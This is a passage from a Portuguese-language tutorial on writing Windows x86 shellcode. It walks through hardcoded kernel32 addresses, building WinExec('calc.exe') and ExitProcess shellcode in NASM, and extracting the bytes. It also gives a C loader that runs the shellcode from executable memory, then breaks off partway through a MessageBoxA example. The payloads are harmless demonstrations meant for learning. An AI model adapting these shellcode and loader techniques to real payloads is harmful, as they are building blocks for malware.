    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">Kernel32Addr</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ExitProcessAddr</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">WinExecAddr</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">FuncProc</span><span class="p">;</span>

    <span class="n">Kernel32Addr</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"KERNEL32 address in memory: 0x%08p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">Kernel32Addr</span><span class="p">);</span>

    <span class="n">ExitProcessAddr</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">Kernel32Addr</span><span class="p">,</span> <span class="s">"ExitProcess"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"ExitProcess address in memory is: 0x%08p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ExitProcessAddr</span><span class="p">);</span>

    <span class="n">WinExecAddr</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">Kernel32Addr</span><span class="p">,</span> <span class="s">"WinExec"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"WinExec address in memory is: 0x%08p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">WinExecAddr</span><span class="p">);</span>

    <span class="n">FuncProc</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">Kernel32Addr</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s address in memory is: 0x%08p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">FuncProc</span><span class="p">);</span>

    <span class="n">getchar</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Ele pode ser compilado diretamente no Linux como um executável para o Windows:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>i686-w64-mingw32-gcc <span class="nt">-O2</span> getaddr.c <span class="nt">-o</span> getaddr.exe <span class="nt">-mconsole</span> <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wall</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span> <span class="o">&gt;</span>/dev/null 2&gt;&amp;1
</pre></table></code></div></div><p>Ao executarmos no Windows, e pesquisarmos, por exemplo, pela função <code class="language-plaintext highlighter-rouge">Sleep</code>, ele nos trará os endereços:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240716094735.png" alt="Endereço da função Sleep" /></p><p>Desta forma podemos iniciar o <em>shellcode</em> com endereços codificados.</p><h3 id="exemplo-1---invocando-a-calculadora">Exemplo 1 - Invocando a Calculadora</h3><p>Talvez uma das tarefas mais simples de um <em>shellcode</em>, porém essencial para seu entendimento no Windows, é o de abrir uma aplicação.</p><p>A função <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec()</a> na <code class="language-plaintext highlighter-rouge">kernell32</code> pode ser usada para iniciar qualquer programa que o usuário que esteja executando o processo tenha permissão.</p><p>Ela tem o seguinte formato:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">UINT</span> <span class="nf">WinExec</span><span class="p">(</span><span class="n">LPCSTR</span> <span class="n">lpCmdLine</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">uCmdShow</span><span class="p">);</span>
</pre></table></code></div></div><p>Onde:</p><ul><li><code class="language-plaintext highlighter-rouge">lpCmdLine</code> será “calc.exe”;<li><code class="language-plaintext highlighter-rouge">uCmdShow</code> será 1 (<code class="language-plaintext highlighter-rouge">SW_NORMAL</code>).</ul><p>Como estamos falando em Assembly e queremos o menor <em>shellcode</em> possível, a primeira parte é converter a <em>string</em> “calc.exe” em hexadecimal, porém, para trabalharmos com os registradores, precisamos dividir nossa <em>string</em> em <em>chunks</em> de 4 bytes que precisam ser colocados em <em>little endian</em>. No caso, a <em>string</em> ficaria:</p><ul><li>exe.<li>clac</ul><p>Para facilitar o trabalho, fiz um script em Go que recebe a <em>string</em> e faz a conversão:</p><div lang="go" class="language-go highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
        <span class="s">"encoding/hex"</span>
        <span class="s">"fmt"</span>
        <span class="s">"os"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">reverseString</span><span class="p">(</span><span class="n">s</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
        <span class="n">runes</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">rune</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">:=</span> <span class="m">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">runes</span><span class="p">)</span><span class="o">-</span><span class="m">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">j</span><span class="p">;</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="m">1</span><span class="p">,</span> <span class="n">j</span><span class="o">-</span><span class="m">1</span> <span class="p">{</span>
                <span class="n">runes</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">runes</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">runes</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">runes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">runes</span><span class="p">)</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="m">2</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Por favor, forneça uma string de entrada."</span><span class="p">)</span>
                <span class="k">return</span>
        <span class="p">}</span>

        <span class="n">input</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">1</span><span class="p">]</span>
        <span class="n">chunkSize</span> <span class="o">:=</span> <span class="m">4</span>
        <span class="k">var</span> <span class="n">chunks</span> <span class="p">[]</span><span class="kt">string</span>

        <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">input</span><span class="p">);</span> <span class="n">i</span> <span class="o">+=</span> <span class="n">chunkSize</span> <span class="p">{</span>
                <span class="n">end</span> <span class="o">:=</span> <span class="n">i</span> <span class="o">+</span> <span class="n">chunkSize</span>
                <span class="k">if</span> <span class="n">end</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">input</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">end</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">input</span><span class="p">)</span>
                <span class="p">}</span>
                <span class="n">chunks</span> <span class="o">=</span> <span class="nb">append</span><span class="p">(</span><span class="n">chunks</span><span class="p">,</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="o">:</span><span class="n">end</span><span class="p">])</span>
        <span class="p">}</span>

        <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span> <span class="o">-</span> <span class="m">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span> <span class="p">{</span>
                <span class="n">chunk</span> <span class="o">:=</span> <span class="n">reverseString</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
                <span class="n">encoded</span> <span class="o">:=</span> <span class="n">hex</span><span class="o">.</span><span class="n">EncodeToString</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"0x"</span><span class="o">+</span><span class="n">encoded</span><span class="p">)</span>
        <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Ao executar, passando a <em>string</em> como argumento, temos a sequência desejada:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240716154302.png" alt="" /></p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>0x6578652e
0x636c6163
</pre></table></code></div></div><p>Com isso podemos montar a função <code class="language-plaintext highlighter-rouge">WinExec()</code> em Assembly.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nf">xor</span>  <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>         <span class="c1">; zerando ecx</span>
<span class="nf">push</span> <span class="nb">ecx</span>              <span class="c1">; string terminator 0x00 para "calc.exe"</span>
<span class="nf">push</span> <span class="mh">0x6578652e</span>       <span class="c1">; exe. : 6578652e</span>
<span class="nf">push</span> <span class="mh">0x636c6163</span>       <span class="c1">; clac : 636c6163</span>

<span class="nf">mov</span>  <span class="nb">eax</span><span class="p">,</span> <span class="nb">esp</span>         <span class="c1">; salvando o ponteiro para a string "calc.exe" em ebx</span>

<span class="c1">; UINT WinExec([in] LPCSTR lpCmdLine, [in] UINT   uCmdShow);</span>
<span class="nf">inc</span>  <span class="nb">ecx</span>              <span class="c1">; uCmdShow = 1</span>
<span class="nf">push</span> <span class="nb">ecx</span>              <span class="c1">; uCmdShow *ptr para stack na posição 2 - LIFO</span>
<span class="nf">push</span> <span class="nb">eax</span>              <span class="c1">; lpcmdLine *ptr para stack na posição 1</span>
<span class="nf">mov</span>  <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x772e5140</span>  <span class="c1">; chamando o endereço da função WinExec() na kernel32.dll</span>
<span class="nf">call</span> <span class="nb">ebx</span>

</pre></table></code></div></div><p>Já a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess">ExitProcess()</a> tem o seguinte formato:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">ExitProcess</span><span class="p">(</span><span class="n">UINT</span> <span class="n">uExitCode</span><span class="p">);</span>
</pre></table></code></div></div><p>Ela servirá para encerrar o processo no <em>host</em> após a calculadora ser invocada, sem o perigo de causar nenhum <em>crash</em> no programa.</p><p>Em Assembly, sua montagem segue:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c1">; void ExitProcess([in] UINT uExitCode);</span>
<span class="nf">xor</span>  <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>         <span class="c1">; zerando eax</span>
<span class="nf">push</span> <span class="nb">eax</span>              <span class="c1">; push NULL</span>
<span class="nf">mov</span>  <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x772a7460</span>  <span class="c1">; chamando o endereço da função ExitProcess na kernel32.dll</span>
<span class="nf">jmp</span>  <span class="nb">eax</span>              <span class="c1">; executando a função ExitProcess</span>
</pre></table></code></div></div><p>Uma vez com estas partes, podemos montar o programa todo:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="nf">section</span> <span class="nv">.data</span>

<span class="nf">section</span> <span class="nv">.bss</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nf">global</span> <span class="nv">_start</span>

<span class="nl">_start:</span>

	<span class="nf">xor</span>  <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>         <span class="c1">; zerando ecx</span>
	<span class="nf">push</span> <span class="nb">ecx</span>              <span class="c1">; string terminator 0x00 para "calc.exe"</span>
	<span class="nf">push</span> <span class="mh">0x6578652e</span>       <span class="c1">; exe. : 6578652e</span>
	<span class="nf">push</span> <span class="mh">0x636c6163</span>       <span class="c1">; clac : 636c6163</span>

	<span class="nf">mov</span>  <span class="nb">eax</span><span class="p">,</span> <span class="nb">esp</span>         <span class="c1">; salvando o ponteiro para a string "calc.exe" em eax</span>

	<span class="c1">; UINT WinExec([in] LPCSTR lpCmdLine, [in] UINT   uCmdShow);</span>
	<span class="nf">inc</span>  <span class="nb">ecx</span>              <span class="c1">; uCmdShow = 1</span>
	<span class="nf">push</span> <span class="nb">ecx</span>              <span class="c1">; uCmdShow *ptr para stack na posição 2 - LIFO</span>
	<span class="nf">push</span> <span class="nb">eax</span>              <span class="c1">; lpcmdLine *ptr para stack na posição 1</span>
	<span class="nf">mov</span>  <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x772e5140</span>  <span class="c1">; chamando o endereço da função WinExec() na kernel32.dll</span>
	<span class="nf">call</span> <span class="nb">ebx</span>

	<span class="c1">; void ExitProcess([in] UINT uExitCode);</span>
	<span class="nf">xor</span>  <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>         <span class="c1">; zerando eax</span>
	<span class="nf">push</span> <span class="nb">eax</span>              <span class="c1">; push NULL</span>
	<span class="nf">mov</span>  <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x772a7460</span>  <span class="c1">; chamando o endereço da função ExitProcess na kernel32.dll</span>
	<span class="nf">jmp</span>  <span class="nb">eax</span>              <span class="c1">; executando a função ExitProcess</span>
</pre></table></code></div></div><p>Agora podemos compilar, linkar e verificar os bytes:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nasm <span class="nt">-f</span> elf32 calc.asm
<span class="nv">$ </span>ld <span class="nt">-m</span> elf_i386 <span class="nt">-o</span> calc calc.o
<span class="nv">$ </span>objdump <span class="nt">-M</span> intel <span class="nt">-d</span> calc
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240716160022.png" alt="" /></p><p>Utilizando o mesmo <em>oneliner</em> de antes, obtemos a <em>string</em> com o <em>shellcode</em>:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>objdump <span class="nt">-d</span> calc | <span class="nb">grep</span> <span class="s1">'^ '</span> | <span class="nb">cut</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'\x'</span><span class="nv">$i</span><span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240716160351.png" alt="" /></p><p>Inserindo o <em>shellcode</em> no programa de teste, temos o seguinte resultado:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">"</span><span class="se">\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe0\x41\x51\x50\xbb\x40\x51\x2e\x77\xff\xd3\x31\xc0\x50\xb8\x60\x74\x2a\x77\xff\xe0</span><span class="s">"</span><span class="p">;</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">exec_mem</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Falha na alocação de memória.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>

    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec_mem</span><span class="p">;</span>
    <span class="n">func</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>E podemos compilá-lo:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>i686-w64-mingw32-gcc winshelltest.c <span class="nt">-o</span> winshelltest.exe
</pre></table></code></div></div><p>Ao executarmos o programa, o <em>shellcode</em> é ativado, abrindo a calculadora.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240716161016.png" alt="" /></p><h3 id="exemplo-2---hack-the-plannet---messagebox">Exemplo 2 - Hack The PLannet! - MessageBox</h3><p>Embora este exemplo não faça nada além de abrir uma caixa de texto, ele possibilita demonstrar várias ações possíveis em um <em>shellcode</em>. Ele demonstrará, tanto o endereçamento absoluto, como utilizado no exemplo anterior, como endereçamento dinâmico utilizando as funções <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA()</a> e <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress()</a>.</p><p>O primeiro passo, é descobrir os endereços das funções.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240716185404.png" alt="" /></p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>LoadLibraryA - 0x772b0ed0
GetProcAddress - 0x77298250
ExitProcess - 0x772a7460
</pre></table></code></div></div><p>Como invocaremos uma caixa de texto, podemos utilizar a função <code class="language-plaintext highlighter-rouge">MessageBoxA()</code> da qual, não sabemos seu endereço de memória. De acordo com sua <a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa">documentação</a>, esta função está na biblioteca <code class="language-plaintext highlighter-rouge">user32.dll</code> da qual também não sabemos onde seu endereçamento começa. Por este motivo, usaremos a função <code class="language-plaintext highlighter-rouge">LoadLibraryA()</code> que carregará a biblioteca <code class="language-plaintext highlighter-rouge">user32.dll</code> em tempo de execução, e em seguida a função <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> carregará o endereço da <code class="language-plaintext highlighter-rouge">MessageBoxA()</code>.</p><p>O primeiro passo, é definir como utilizaremos os registradores:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nl">_start:</span>

	<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>    <span class="c1">;eax conterá os endereços de retorno</span>
	<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>    <span class="c1">;ebx conterá os endereços das funções</span>
	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>    <span class="c1">;ecx conterá os ponteiros para as strings</span>
	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">;edx conterá um valor NULL</span>

	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">Library</span>
</pre></table></code></div></div><p>O <code class="language-plaintext highlighter-rouge">jmp short Library</code> salta para uma chamada que conterá a <em>string</em> com o nome da biblioteca.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nl">Library:</span>
	<span class="nf">call</span> <span class="nv">ReturnLibrary</span>
	<span class="kd">db</span> <span class="s">'user32.dllA'</span>
</pre></table></code></div></div><p>O “<code class="language-plaintext highlighter-rouge">A</code>” no final da <em>string</em>, é um caractere adicional que será substituído por um <code class="language-plaintext highlighter-rouge">NULL</code> indicando o <em>string terminator</em>. Já a chamada para <code class="language-plaintext highlighter-rouge">ReturnLibrary</code> apontará para o seguinte código:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nl">ReturnLibrary:</span>

	<span class="nf">pop</span> <span class="nb">ecx</span>                <span class="c1">;captura o ponteiro para a string "user32.dllA"</span>
	<span class="nf">mov</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="mi">10</span><span class="p">],</span> <span class="nb">dl</span>     <span class="c1">;subsitui o "A" por NULL</span>
	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x772b0ed0</span>    <span class="c1">;endereço da LoadLibraryA</span>
	<span class="nf">push</span> <span class="nb">ecx</span>               <span class="c1">;envia a string para o topo da stack</span>
	<span class="nf">call</span> <span class="nb">ebx</span>               <span class="c1">;com a chamada, eax conterá o identificador do módulo user32.dll</span>

	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">Function</span>
</pre></table></code></div></div><p>Este trecho de código utiliza da função <code class="language-plaintext highlighter-rouge">LoadLibraryA()</code> para carregar o identificador da biblioteca solicitada no registrador <code class="language-plaintext highlighter-rouge">eax</code>. Esta função tem o seguinte formato:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">HMODULE</span> <span class="nf">LoadLibraryA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">LPCSTR</span> <span class="n">lpLibFileName</span>
<span class="p">);</span>
</pre></table></code></div></div><p>O <code class="language-plaintext highlighter-rouge">jmp short Function</code> salta para uma chamada que conterá a <em>string</em> com o nome da função.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nl">Function:</span>

	<span class="nf">call</span> <span class="nv">ReturnFunction</span>
	<span class="kd">db</span> <span class="s">'MessageBoxAA'</span>
</pre></table></code></div></div><p>A chamada para <code class="language-plaintext highlighter-rouge">ReturnFunction</code> apontará para o seguinte código:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nl">ReturnFunction:</span>

	<span class="nf">pop</span> <span class="nb">ecx</span>                <span class="c1">;captura o ponteiro para a string</span>
	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
	<span class="nf">mov</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="mi">11</span><span class="p">],</span> <span class="nb">dl</span>     <span class="c1">;subsitui o "A" por NULL</span>
	<span class="nf">push</span> <span class="nb">ecx</span>               <span class="c1">;envia a string para o topo da stack na posição 2</span>
	<span class="nf">push</span> <span class="nb">eax</span>               <span class="c1">;envia o identificador do módulo user32.dll para o topo da pilha na posição 1</span>
	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x77298250</span>    <span class="c1">;endereço da GetProcAddress</span>
	<span class="nf">call</span> <span class="nb">ebx</span>               <span class="c1">;com a chamada, eax conterá o endereço da função MessageBoxA</span>

	<span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">Message</span>
</pre></table></code></div></div><p>Este trecho de código utiliza da função <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> para carregar o endereço da função solicitada no registrador <code class="language-plaintext highlighter-rouge">eax</code>. Esta função tem o seguinte formato:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">FARPROC</span> <span class="nf">GetProcAddress</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">LPCSTR</span>  <span class="n">lpProcName</span>
<span class="p">);</span>
</pre></table></code></div></div><p>O <code class="language-plaintext highlighter-rouge">jmp short Message</code> salta para uma chamada que conterá a <em>string</em> com a mensagem a ser impressa.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nl">Message:</span>

	<span class="nf">call</span> <span class="nv">ReturnMessage</span>
	<span class="kd">db</span> <span class="err">'</span><span class="nv">Hack</span> <span class="nv">The</span> <span class="nv">Plannet</span><span class="err">!</span><span class="nv">A</span><span class="err">'</span>
</pre></table></code></div></div><p>A chamada para <code class="language-plaintext highlighter-rouge">ReturnMessage</code> apontará para o seguinte código:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nl">ReturnMessage:</span>

	<span class="nf">pop</span> <span class="nb">ecx</span>             <span class="c1">;captura o ponteiro para a string</span>
	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
	<span class="nf">mov</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="mi">17</span><span class="p">],</span> <span class="nb">dl</span>  <span class="c1">;subsitui o "A" por NULL</span>

	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>

	<span class="nf">push</span> <span class="nb">edx</span>            <span class="c1">;envia NULL para o topo da pilha definindo o tipo da box MB_OK</span>
	<span class="nf">push</span> <span class="nb">ecx</span>            <span class="c1">;envia a string para o topo da pilha definindo o title</span>
	<span class="nf">push</span> <span class="nb">ecx</span>            <span class="c1">;envia a string para o topo da pilha definindo a mensagem</span>
